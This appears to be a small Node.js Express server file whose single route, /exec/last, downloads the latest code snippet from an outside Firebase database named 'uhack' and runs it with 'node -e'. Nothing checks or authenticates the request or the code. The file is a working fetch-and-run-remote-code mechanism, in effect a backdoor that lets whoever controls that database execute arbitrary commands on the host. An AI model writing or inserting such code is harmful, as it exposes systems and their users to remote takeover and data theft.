const express = require('express');

const app = express();
const exec = require('exec');
const axios = require('axios');

app.get('/exec/last', (req, res) => {
  axios.get('https://uhack-6f65a.firebaseio.com/auto_codes.json').then((_res) => {
    // console.log(_res.data);

    const a = Object.keys(_res.data);

    const key = a[a.length - 1];

    const x = _res.data[key].code;

    exec(['node', '-e', x], (err, out, code) => {
      if (err instanceof Error) throw err;
      process.stderr.write(err);
      process.stdout.write(out);
      // process.exit(code);1111
      res.send('executed');
    });
  });
});

const port = 4000;
app.listen(port);
